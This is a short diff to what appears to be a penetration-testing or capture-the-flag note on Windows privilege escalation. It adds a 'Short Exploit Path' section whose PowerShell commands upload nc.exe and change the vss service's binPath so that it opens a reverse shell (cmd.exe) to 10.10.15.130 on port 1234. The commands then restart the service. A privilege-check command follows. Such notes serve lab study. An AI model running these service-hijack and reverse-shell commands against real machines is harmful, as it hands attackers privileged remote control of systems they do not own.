@@ -1,3 +1,13 @@
+# Short Exploit Path
+```powershell
+upload nc.exe
+
+sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.130 1234"
+
+sc.exe stop vss
+sc.exe start vss
+```
+
 # Confirming Privileges
 ```powershell
 whoami /priv
